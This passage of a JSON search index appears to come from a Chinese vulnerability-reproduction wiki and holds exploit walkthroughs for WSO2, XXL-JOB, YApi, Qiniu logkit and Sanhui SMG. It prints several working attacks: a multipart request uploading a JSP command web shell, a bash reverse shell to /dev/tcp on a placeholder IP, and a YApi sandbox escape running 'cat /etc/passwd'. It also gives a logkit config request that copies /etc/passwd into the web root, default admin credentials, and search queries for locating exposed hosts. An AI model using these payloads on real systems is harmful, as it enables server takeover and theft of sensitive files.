","date":"0001-01-01","objectID":"/wisegiga-nas-group.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/wisegiga-nas-group.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"WSO2 fileupload 任意文件上传漏洞 CVE-2022-29464 ","date":"0001-01-01","objectID":"/wso2-fileupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2022-29464/:0:0","tags":null,"title":"","uri":"/wso2-fileupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2022-29464/"},{"categories":null,"content":"漏洞描述 CVE-2022-29464 是 Orange Tsai发现的 WSO2 上的严重漏洞。该漏洞是一种未经身份验证的无限制任意文件上传，允许未经身份验证的攻击者通过上传恶意 JSP 文件在 WSO2 服务器上获得 RCE。 ","date":"0001-01-01","objectID":"/wso2-fileupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2022-29464/:1:0","tags":null,"title":"","uri":"/wso2-fileupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2022-29464/"},{"categories":null,"content":"漏洞影响 WSO2 API Manager 2.2.0 and above WSO2 Identity Server 5.2.0 and above WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, 5.6.0 WSO2 Identity Server as Key Manager 5.3.0 and above WSO2 Enterprise Integrator 6.2.0 and above ","date":"0001-01-01","objectID":"/wso2-fileupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2022-29464/:2:0","tags":null,"title":"","uri":"/wso2-fileupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2022-29464/"},{"categories":null,"content":"环境搭建 https://github.com/wso2/product-apim/releases/download/v4.0.0/wso2am-4.0.0.zip https://github.com/wso2/product-apim/archive/refs/tags/v4.0.0.zip ","date":"0001-01-01","objectID":"/wso2-fileupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2022-29464/:3:0","tags":null,"title":"","uri":"/wso2-fileupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2022-29464/"},{"categories":null,"content":"漏洞复现 下载 releases 后进入 bin目录, 执行 api.manager.sh文件，并开启 debug 方便远程调试 打开 product-apim-4.0.0 ，下载依赖，连接Debug进行调试分析 运行后访问 localhost:9443 出现如下即搭建完成 在配置文件 identity.xml 中我们可以看到 路由 /fileupload 中不存在权限鉴定, 对应的 Servlet 为 FileUploadServlet 文件上传为POST请求，对应的处理方法为 doPost (org.wso2.carbon.ui.transports.FileUploadServlet#doPost) protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { try { fileUploadExecutorManager.execute(request, response); } catch (Exception e) { String msg = \"File upload failed \"; log.error(msg, e); throw new ServletException(e); } } 继续向下，略过调用方法的过程 execute:55, ToolsAnyFileUploadExecutor (org.wso2.carbon.ui.transports.fileupload) executeGeneric:104, AbstractFileUploadExecutor (org.wso2.carbon.ui.transports.fileupload) execute:436, FileUploadExecutorManager$CarbonXmlFileUploadExecHandler (org.wso2.carbon.ui.transports.fileupload) startExec:320, FileUploadExecutorManager$FileUploadExecutionHandlerManager (org.wso2.carbon.ui.transports.fileupload) execute:127, FileUploadExecutorManager (org.wso2.carbon.ui.transports.fileupload) 最后来到出现漏洞的位置 org.wso2.carbon.ui.transports.fileupload.ToolsAnyFileUploadExecutor#execute 这里我们构造请求包，上传文件 POST /fileupload/toolsAny HTTP/1.1 Host: localhost:9443 Accept: */* Accept-Encoding: gzip, deflate Content-Length: 729 Content-Type: multipart/form-data; boundary=4ef9f369a86bfaadf5ec3177278d49c0 User-Agent: python-requests/2.22.0 --4ef9f369a86bfaadf5ec3177278d49c0 Content-Disposition: form-data; name=\"1.jsp\"; filename=\"1.jsp\" \u003cFORM\u003e \u003cINPUT name='cmd' type=text\u003e \u003cINPUT type=submit value='Run'\u003e \u003c/FORM\u003e \u003c%@ page import=\"java.io.*\" %\u003e \u003c% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd,null,null); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s+\"\u003c/br\u003e\"; } } catch(IOException e) { e.printStackTrace(); } } %\u003e \u003cpre\u003e\u003c%=output %\u003e\u003c/pre\u003e --4ef9f369a86bfaadf5ec3177278d49c0-- 上传时文件名为 1.jsp，成功上传目标会返回 uuid 值, 调试过程中我们可以发现文件被上传在某个目录下 public class ToolsAnyFileUploadExecutor extends AbstractFileUploadExecutor { @Override public boolean execute(HttpServletRequest request, HttpServletResponse response) throws CarbonException, IOException { PrintWriter out = response.getWriter(); try { Map fileResourceMap = (Map) configurationContext .getProperty(ServerConstants.FILE_RESOURCE_MAP); if (fileResourceMap == null) { fileResourceMap = new TreeBidiMap(); configurationContext.setProperty(ServerConstants.FILE_RESOURCE_MAP, fileResourceMap); } List\u003cFileItemData\u003e fileItems = getAllFileItems(); //String filePaths = \"\"; for (FileItemData fileItem : fileItems) { String uuid = String.valueOf( System.currentTimeMillis() + Math.random()); String serviceUploadDir = configurationContext .getProperty(ServerConstants.WORK_DIR) + File.separator + \"extra\" + File .separator + uuid + File.separator; File dir = new File(serviceUploadDir); if (!dir.exists()) { dir.mkdirs(); } File uploadedFile = new File(dir, fileItem.getFileItem().getFieldName()); try (FileOutputStream fileOutStream = new FileOutputStream(uploadedFile)) { fileItem.getDataHandler().writeTo(fileOutStream); fileOutStream.flush(); } response.setContentType(\"text/plain; charset=utf-8\"); //filePaths = filePaths + uploadedFile.getAbsolutePath() + \",\"; fileResourceMap.put(uuid, uploadedFile.getAbsolutePath()); out.write(uuid); } //filePaths = filePaths.substring(0, filePaths.length() - 1); //out.write(filePaths); out.flush(); } catch (Exception e) { log.error(\"File upload FAILED\", e); out.write(\"\u003cscript type=\\\"text/javascript\\\"\u003e\" + \"top.wso2.wsf.Util.alertWarning('File upload FAILED. File may be non-existent or invalid.');\" + \"\u003c/script\u003e\"); } finally { out.close(); } return true; } } 但文件名是我们可控的，拼接的过程中我们通过控制文件名遍历目录，将文件上传到我们需要的位置, 查找可以解析 jsp文件的目录 构造请求包，通过控制文件名的方法上传至该目录中 POST /fileupload/toolsAny HTTP/1.1 Host: localhost:9443 Accept: */* Accept-Encoding: gzip, ","date":"0001-01-01","objectID":"/wso2-fileupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2022-29464/:4:0","tags":null,"title":"","uri":"/wso2-fileupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2022-29464/"},{"categories":null,"content":"WSO2 proxy SSRF漏洞 WSO2-2019-0598 ","date":"0001-01-01","objectID":"/wso2-proxy-ssrf%E6%BC%8F%E6%B4%9E-wso2-2019-0598/:0:0","tags":null,"title":"","uri":"/wso2-proxy-ssrf%E6%BC%8F%E6%B4%9E-wso2-2019-0598/"},{"categories":null,"content":"漏洞描述 滥用 shindig Web 应用程序的 UI 小工具加载功能可以利用此漏洞。攻击者可以更改请求中的特定 URL，从而导致服务器向更改后的 URL 发起 GET 请求。通过利用此漏洞，攻击者可以使用服务器执行任意外部服务交互。这可以特别用于与内部网络的节点进行交互，否则这些节点会被网络规则隐藏在外部。攻击者可以利用它来追踪和侦察网络，除此之外，如果有内部端点对 GET 请求进行状态更改操作，那么就有可能很好地破坏它们的完整性。根据端点实施的保护级别，此漏洞的影响可能会有所不同。 ","date":"0001-01-01","objectID":"/wso2-proxy-ssrf%E6%BC%8F%E6%B4%9E-wso2-2019-0598/:1:0","tags":null,"title":"","uri":"/wso2-proxy-ssrf%E6%BC%8F%E6%B4%9E-wso2-2019-0598/"},{"categories":null,"content":"漏洞影响 WSO2 Identity Server 5.2.0 , 5.3.0 , 5.4.0 , 5.4.1 , 5.5.0 , 5.6.0 , 5.7.0 WSO2 IS as Key Manager 5.3.0 , 5.5.0 , 5.6.0 , 5.7.0 ","date":"0001-01-01","objectID":"/wso2-proxy-ssrf%E6%BC%8F%E6%B4%9E-wso2-2019-0598/:2:0","tags":null,"title":"","uri":"/wso2-proxy-ssrf%E6%BC%8F%E6%B4%9E-wso2-2019-0598/"},{"categories":null,"content":"环境搭建 https://github.com/wso2/product-is/releases/download/v5.6.0-rc3/wso2is-5.6.0-rc3.zip ","date":"0001-01-01","objectID":"/wso2-proxy-ssrf%E6%BC%8F%E6%B4%9E-wso2-2019-0598/:3:0","tags":null,"title":"","uri":"/wso2-proxy-ssrf%E6%BC%8F%E6%B4%9E-wso2-2019-0598/"},{"categories":null,"content":"漏洞复现 根据官方描述，漏洞造成的原因主要是 shindig Web 应用程序的 UI 小工具的加载功能, WSO2-2019-0598 下载源码启动环境，在IDEA中调试 根据官方描述，在全局搜索 shindig 相关代码 打下断点，看一下访问 /shindig/gadgets/js 路径时代码的调用流程 可以看到当访问此路径时，调用了对应的 Servlet 下的 doGet方法 来处理(org.apache.shindig.gadgets.servlet.JsServlet.doGet(JsServlet.java:86) 我们可以在文件 conf/shindig/web.xml 找到对应的调用方法 看到这我们注意到 org.apache.shindig.gadgets.servlet.MakeRequestServlet 似乎与 Jira未授权SSRF漏洞(CVE-2019-8451) 中存在的漏洞点十分的相似 但断点调试过程中，却发现这个点是利用失败的 只好去看一下其他的Servele , 最后我们注意到 ProxyServlet 发送请求包，打断点看一下处理流程 GET /shindig/gadgets/proxy?container=default\u0026url=https://www.baidu.com HTTP/1.1 Host: localhost:9443 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Content-Length: 0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\" Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \"macOS\" Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: cross-site Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 通过 org.apache.shindig.gadgets.servlet.ProxyServlet 下的 doGet方法接收参数， 传入 processRequest 中 private void processRequest(HttpServletRequest request, HttpServletResponse servletResponse) throws IOException { if (request.getHeader(\"If-Modified-Since\") != null) { servletResponse.setStatus(304); } else { Uri reqUri = (new UriBuilder(request)).toUri(); HttpResponse response; try { ProxyUri proxyUri = this.proxyUriManager.process(reqUri); SecurityToken st = AuthInfoUtil.getSecurityTokenFromRequest(request); proxyUri.setSecurityToken(st); proxyUri.setUserAgent(request.getHeader(\"User-Agent\")); if (proxyUri.getGadget() == null \u0026\u0026 st != null \u0026\u0026 !st.isAnonymous()) { proxyUri.setGadget(st.getAppUrl()); } AuthType authType = proxyUri.getAuthType(); if (AuthType.OAUTH.equals(authType)) { proxyUri.setOAuthArguments(new OAuthArguments(AuthType.OAUTH, request)); } else if (AuthType.OAUTH2.equals(authType)) { proxyUri.setOAuth2Arguments(new OAuth2Arguments(request)); } String host = request.getHeader(\"Host\"); if (!this.lockedDomainService.isSafeForOpenProxy(host)) { Uri resourceUri = proxyUri.getResource(); String msg = \"Embed request for url \" + (resourceUri != null ? resourceUri.toString() : \"n/a\") + \" made to wrong domain \" + host; if (LOG.isLoggable(Level.INFO)) { LOG.logp(Level.INFO, classname, \"processRequest\", \"embededImgWrongDomain\", new Object[]{resourceUri != null ? resourceUri.toString() : \"n/a\", host}); } throw new GadgetException(Code.INVALID_PARAMETER, msg, 400); } if (\"POST\".equalsIgnoreCase(request.getMethod())) { StringBuffer buffer = this.getPOSTContent(request); response = this.proxyHandler.fetch(proxyUri, buffer.toString()); } else { response = this.proxyHandler.fetch(proxyUri); } } catch (GadgetException var11) { response = ServletUtil.errorResponse(new GadgetException(var11.getCode(), var11.getMessage(), 400)); } ServletUtil.copyToServletResponseAndOverrideCacheHeaders(response, servletResponse); } } 向下跟进到org.apache.shindig.gadgets.servlet.ProxyHandler org.apache.shindig.gadgets.servlet.ProxyHandler.fatch 接着向下看到 org.apache.shindig.gadgets.servlet.ProxyHandler 下的 buildHttpRequest 方法创建Http请求， 而目标就是我们刚刚传入的Url参数 private HttpRequest buildHttpRequest(ProxyUri uriCtx, Uri tgt, @Nullable String postBody) throws GadgetException, IOException { ServletUtil.validateUrl(tgt); HttpRequest req = uriCtx.makeHttpRequest(tgt); req.setRewriteMimeType(uriCtx.getRewriteMimeType()); if (postBody != null) { req.setMethod(\"POST\"); req.setPostBody(new ByteArrayInputStream(postBody.getBytes())); } if (req.getHeader(\"User-Agent\") == null) { String userAgent = uriCtx.getUserAgent(); if (userAgent != null) { req.setHeader(\"User-Agent\", userAgent); } } return req; } 最后回显至页面中, 造成存在回显的SSRF ","date":"0001-01-01","objectID":"/wso2-proxy-ssrf%E6%BC%8F%E6%B4%9E-wso2-2019-0598/:4:0","tags":null,"title":"","uri":"/wso2-proxy-ssrf%E6%BC%8F%E6%B4%9E-wso2-2019-0598/"},{"categories":null,"content":"XXL-JOB 任务调度中心 后台任意命令执行漏洞 ","date":"0001-01-01","objectID":"/xxl-job-%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/xxl-job-%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 XXL-JOB 任务调度中心攻击者可以在后台可以通过写入shell命令任务调度获取服务器权限 ","date":"0001-01-01","objectID":"/xxl-job-%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/xxl-job-%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 XXL-JOB ","date":"0001-01-01","objectID":"/xxl-job-%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/xxl-job-%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"XXL-JOB\" || title=\"任务调度中心\" ","date":"0001-01-01","objectID":"/xxl-job-%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/xxl-job-%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录后台增加一个任务 默认口令 admin/123456 注意运行模式需要为 GLUE(shell) 点击 GLUE IDE编辑脚本 执行探测出网，和任务调用是否可执行 反弹一个shell #!/bin/bash bash -c 'exec bash -i \u0026\u003e/dev/tcp/xxx.xxx.xxx.xxx/9999 \u003c\u00261' ","date":"0001-01-01","objectID":"/xxl-job-%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/xxl-job-%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E4%B8%AD%E5%BF%83-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"YApi 接口管理平台 后台命令执行漏洞 ","date":"0001-01-01","objectID":"/yapi-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/yapi-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 YApi 接口管理平台 后台存在命令执行漏洞，攻击者通过发送特定的请求可执行任意命令获取服务器权限 ","date":"0001-01-01","objectID":"/yapi-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/yapi-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 YApi 接口管理平台 ","date":"0001-01-01","objectID":"/yapi-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/yapi-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"YApi\" ","date":"0001-01-01","objectID":"/yapi-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/yapi-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 首先需要注册账户并登录 添加项目，参数任意 创建后点击 高级Mock 输入如下Payload const sandbox = this; // 获取Context const ObjectConstructor = this.constructor; // 获取 Object 对象构造函数 const FunctionConstructor = ObjectConstructor.constructor; // 获取 Function 对象构造函数 const myfun = FunctionConstructor('return process'); // 构造一个函数，返回process全局变量 const process = myfun(); mockJson = process.mainModule.require(\"child_process\").execSync(\"cat /etc/passwd\").toString() 预览处点击项目链接 ","date":"0001-01-01","objectID":"/yapi-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/yapi-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"七牛云 logkit log_path 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%83%E7%89%9B%E4%BA%91-logkit-log_path-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%83%E7%89%9B%E4%BA%91-logkit-log_path-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 七牛云 logkit log_path 参数可自定义读取服务器文件，配合读取的文件写入Web目录将会使攻击者读取到服务器任意文件，造成服务器敏感信息泄漏 ","date":"0001-01-01","objectID":"/%E4%B8%83%E7%89%9B%E4%BA%91-logkit-log_path-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%83%E7%89%9B%E4%BA%91-logkit-log_path-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 七牛云 logkit V1.4.1 ","date":"0001-01-01","objectID":"/%E4%B8%83%E7%89%9B%E4%BA%91-logkit-log_path-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%83%E7%89%9B%E4%BA%91-logkit-log_path-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"七牛Logkit配置文件助手\" ","date":"0001-01-01","objectID":"/%E4%B8%83%E7%89%9B%E4%BA%91-logkit-log_path-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%83%E7%89%9B%E4%BA%91-logkit-log_path-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 主页面 发送请求包配置读取文件 PUT /logkit/configs/passwdread HTTP/1.1 Host: Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Content-Length: 356 Content-Type: application/json User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 { \"name\": \"passwdread\", \"batch_interval\": 1, \"collect_interval\": 1, \"reader\": { \"mode\": \"file\", \"log_path\": \"/etc/passwd\", \"read_from\": \"oldest\", \"datasource_tag\": \"datasource\", \"encoding\": \"UTF-8\" }, \"parser\": { \"type\": \"raw\", \"name\": \"parser\", \"timestamp\": \"true\" }, \"transforms\": [], \"senders\": [ { \"sender_type\": \"file\", \"file_send_path\": \"/app/public/passwd.log\" } ] } 请求读取的文件 /app/public 目录为Docker默认Web路径，写入可读取目标文件 ","date":"0001-01-01","objectID":"/%E4%B8%83%E7%89%9B%E4%BA%91-logkit-log_path-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%83%E7%89%9B%E4%BA%91-logkit-log_path-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"三汇SMG 网关管理软件 down.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%89%E6%B1%87smg-%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%89%E6%B1%87smg-%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 三汇SMG 网关管理软件 down.php文件中存在任意文件读取漏洞，攻击者通过漏洞可以下载服务器任意文 ","date":"0001-01-01","objectID":"/%E4%B8%89%E6%B1%87smg-%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%89%E6%B1%87smg-%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 三汇SMG 网关管理软件 ","date":"0001-01-01","objectID":"/%E4%B8%89%E6%B1%87smg-%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%89%E6%B1%87smg-%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"text ml10 mr20\" \u0026\u0026 title=\"网关管理软件\" ","date":"0001-01-01","objectID":"/%E4%B8%89%E6%B1%87smg-%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%89%E6%B1%87smg-%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 存在漏洞的页面为 down.php ","date":"0001-01-01","objectID":"/%E4%B8%89%E6%B1%87smg-%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%89%E6%B1%87smg-%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"中新金盾信息安全管理系统 默认超级管理员密码漏洞 